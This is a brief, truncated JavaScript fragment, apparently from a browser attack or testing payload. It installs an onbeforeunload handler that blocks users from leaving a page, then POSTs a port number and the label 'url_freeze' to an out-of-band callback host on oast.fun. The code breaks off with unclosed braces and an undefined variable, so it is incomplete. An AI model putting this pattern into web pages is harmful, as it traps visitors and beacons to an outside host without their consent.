    window.onbeforeunload = function(e) {

        e.returnValue = '';

    fetch('https://xzyoueivlwuoczvmzdkqqjenlqqjxdxxl.oast.fun/port_hang', {
        method: 'POST',
        body: JSON.stringify({port: randomPort, technique: 'url_freeze'})
